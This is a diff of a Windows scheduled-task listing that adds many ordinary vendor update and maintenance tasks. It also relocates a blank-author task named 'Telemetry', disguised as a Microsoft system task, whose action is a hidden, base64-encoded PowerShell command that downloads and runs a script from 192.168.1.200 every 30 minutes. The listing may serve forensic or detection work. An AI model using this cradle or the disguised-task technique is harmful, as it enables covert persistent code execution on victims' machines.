@@ -27,6 +27,15 @@ Actions           : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /c
 Triggers          : Daily at 1:12 AM
 LastTaskResult    : 0
 
+TaskPath          : \GoogleUpdateTaskMachineUA
+TaskName          : GoogleUpdateTaskMachineUA
+LastRunTime       : 2026-09-12 05:12:44
+NextRunTime       : 2026-09-12 10:12:44
+Author            : 
+Actions           : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /ua
+Triggers          : Repeats every 5 hours indefinitely, starting 2026-09-01 00:00:00
+LastTaskResult    : 0
+
 TaskPath          : \Microsoft\Windows\OfficeSoftwareProtectionPlatform\
 TaskName          : SvcRestartTask
 LastRunTime       : 2026-09-12 04:00:00
@@ -40,18 +49,9 @@ TaskPath          : \Microsoft\OneDrive\
 TaskName          : OneDrive Standalone Update Task-S-1-5-21
 LastRunTime       : 2026-09-11 22:30:00
 NextRunTime       : 2026-09-12 22:30:00
-Author            :
+Author            : 
 Actions           : "C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe"
 Triggers          : Daily at 10:30 PM
-LastTaskResult    : 0
-
-TaskPath          : \Microsoft\Windows\SystemHealth\
-TaskName          : Telemetry
-LastRunTime       : 2026-09-12 08:47:19
-NextRunTime       : 2026-09-12 09:17:19
-Author            :
-Actions           : powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAGEALgBwAHMAMQAnACkA
-Triggers          : Repeats every 30 minutes indefinitely, starting 2026-09-12 06:00:00
 LastTaskResult    : 0
 
 TaskPath          : \Microsoft\Windows\Diagnosis\
@@ -61,4 +61,211 @@ NextRunTime       : 2026-09-13 05:00:00
 Author            : Microsoft Corporation
 Actions           : %windir%\system32\DeviceCensus.exe
 Triggers          : Daily at 5:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Maintenance\
+TaskName          : WinSAT
+LastRunTime       : 2026-09-11 02:00:00
+NextRunTime       : N/A
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\winsat.exe formal
+Triggers          : On idle
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\DiskCleanup\
+TaskName          : SilentCleanup
+LastRunTime       : 2026-09-05 03:00:00
+NextRunTime       : N/A
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
+Triggers          : On idle
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Application Experience\
+TaskName          : Microsoft Compatibility Appraiser
+LastRunTime       : 2026-09-12 04:16:00
+NextRunTime       : 2026-09-13 04:16:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun
+Triggers          : Daily at 4:16 AM
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Application Experience\
+TaskName          : ProgramDataUpdater
+LastRunTime       : 2026-09-11 12:00:00
+NextRunTime       : N/A
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\CompatTelRunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun
+Triggers          : At sign in
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Customer Experience Improvement Program\
+TaskName          : Consolidator
+LastRunTime       : 2026-09-05 03:00:00
+NextRunTime       : 2026-09-19 03:00:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\wsqmcons.exe
+Triggers          : Weekly on Sunday at 3:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Customer Experience Improvement Program\
+TaskName          : UsbCeip
+LastRunTime       : 2026-09-12 07:00:00
+NextRunTime       : 2026-09-13 07:00:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\rundll32.exe USBCEIP.DLL,USBCEIPFireUp
+Triggers          : Daily at 7:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\NetTrace\
+TaskName          : GatherNetworkInfo
+LastRunTime       : 2026-09-12 08:47:00
+NextRunTime       : 2026-09-12 09:02:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\netsh.exe trace stop
+Triggers          : Repeats every 15 minutes indefinitely, starting 2026-09-01 00:00:00
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\SystemHealth\
+TaskName          : Telemetry
+LastRunTime       : 2026-09-12 08:47:19
+NextRunTime       : 2026-09-12 09:17:19
+Author            : 
+Actions           : powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADAAMAAvAGEALgBwAHMAMQAnACkA
+Triggers          : Repeats every 30 minutes indefinitely, starting 2026-09-12 06:00:00
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Time Synchronization\
+TaskName          : SynchronizeTime
+LastRunTime       : 2026-09-12 01:00:00
+NextRunTime       : 2026-09-13 01:00:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\sc.exe start w32time task_started
+Triggers          : Daily at 1:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Defrag\
+TaskName          : ScheduledDefrag
+LastRunTime       : 2026-09-08 01:00:00
+NextRunTime       : 2026-09-15 01:00:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\defrag.exe -c -h -o
+Triggers          : Weekly on Wednesday at 1:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Chkdsk\
+TaskName          : ProactiveScan
+LastRunTime       : 2026-09-01 02:00:00
+NextRunTime       : N/A
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\chkdsk.exe /proactivescan
+Triggers          : On idle
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\Windows Error Reporting\
+TaskName          : QueueReporting
+LastRunTime       : 2026-09-12 09:10:00
+NextRunTime       : N/A
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\wermgr.exe -upload
+Triggers          : On event
+LastTaskResult    : 0
+
+TaskPath          : \Microsoft\Windows\WindowsColorSystem\
+TaskName          : Calibration Loader
+LastRunTime       : 2026-09-12 06:00:00
+NextRunTime       : 2026-09-13 06:00:00
+Author            : Microsoft Corporation
+Actions           : %windir%\system32\dccw.exe -profile
+Triggers          : At sign in
+LastTaskResult    : 0
+
+TaskPath          : \Adobe Acrobat Update Task
+TaskName          : Adobe Acrobat Update Task
+LastRunTime       : 2026-09-12 06:15:00
+NextRunTime       : 2026-09-13 06:15:00
+Author            : Adobe Inc.
+Actions           : "C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"
+Triggers          : Daily at 6:15 AM
+LastTaskResult    : 0
+
+TaskPath          : \Adobe Genuine Monitor
+TaskName          : Adobe Genuine Monitor
+LastRunTime       : 2026-09-12 07:30:05
+NextRunTime       : 2026-09-12 19:30:05
+Author            : 
+Actions           : "C:\Program Files (x86)\Common Files\Adobe\OOBE\PDApp\UWA\Adobe Genuine Monitor.exe"
+Triggers          : Repeats every 12 hours indefinitely, starting 2026-09-09 00:00:00
+LastTaskResult    : 0
+
+TaskPath          : \Dropbox Update Task-S-1-5-21
+TaskName          : Dropbox Update Task-S-1-5-21
+LastRunTime       : 2026-09-12 03:00:00
+NextRunTime       : 2026-09-13 03:00:00
+Author            : 
+Actions           : "C:\Program Files (x86)\Dropbox\Update\DropboxUpdate.exe" /c
+Triggers          : Daily at 3:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \NvTmRep_CrashReport1_S-1-5-21
+TaskName          : NvTmRep_CrashReport1_S-1-5-21
+LastRunTime       : 2026-09-10 16:44:00
+NextRunTime       : N/A
+Author            : NVIDIA Corporation
+Actions           : "C:\Program Files\NVIDIA Corporation\NvTelemetry\NvTmRep.exe"
+Triggers          : On event
+LastTaskResult    : 0
+
+TaskPath          : \NVIDIA GeForce Experience SelfUpdate
+TaskName          : SelfUpdate
+LastRunTime       : 2026-09-12 02:00:00
+NextRunTime       : 2026-09-13 02:00:00
+Author            : NVIDIA Corporation
+Actions           : "C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerLocalSystem.exe" -update
+Triggers          : Daily at 2:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \MicrosoftEdgeUpdateTaskMachineCore
+TaskName          : MicrosoftEdgeUpdateTaskMachineCore
+LastRunTime       : 2026-09-12 03:41:00
+NextRunTime       : 2026-09-13 03:41:00
+Author            : Microsoft Corporation
+Actions           : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /c
+Triggers          : Daily at 3:41 AM
+LastTaskResult    : 0
+
+TaskPath          : \MicrosoftEdgeUpdateTaskMachineUA
+TaskName          : MicrosoftEdgeUpdateTaskMachineUA
+LastRunTime       : 2026-09-12 05:41:00
+NextRunTime       : 2026-09-12 11:41:00
+Author            : 
+Actions           : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /ua
+Triggers          : Repeats every 6 hours indefinitely, starting 2026-09-01 00:00:00
+LastTaskResult    : 0
+
+TaskPath          : \CCleanerSkipUAC
+TaskName          : CCleanerSkipUAC
+LastRunTime       : 2026-09-11 20:00:00
+NextRunTime       : N/A
+Author            : Piriform Software Ltd
+Actions           : "C:\Program Files\CCleaner\CCleaner64.exe" /MONITOR
+Triggers          : At sign in
+LastTaskResult    : 0
+
+TaskPath          : \Zoom Updater
+TaskName          : Zoom Updater
+LastRunTime       : 2026-09-12 04:00:00
+NextRunTime       : 2026-09-13 04:00:00
+Author            : Zoom Video Communications, Inc.
+Actions           : "C:\Users\jsmith\AppData\Roaming\Zoom\bin\Zoom.exe" /update
+Triggers          : Daily at 4:00 AM
+LastTaskResult    : 0
+
+TaskPath          : \CrowdStrike\Falcon Quick Scan
+TaskName          : Falcon Quick Scan
+LastRunTime       : 2026-09-12 05:30:00
+NextRunTime       : 2026-09-13 05:30:00
+Author            : CrowdStrike, Inc.
+Actions           : "C:\Windows\System32\drivers\CrowdStrike\CSFalconService.exe" -quickscan
+Triggers          : Daily at 5:30 AM
 LastTaskResult    : 0
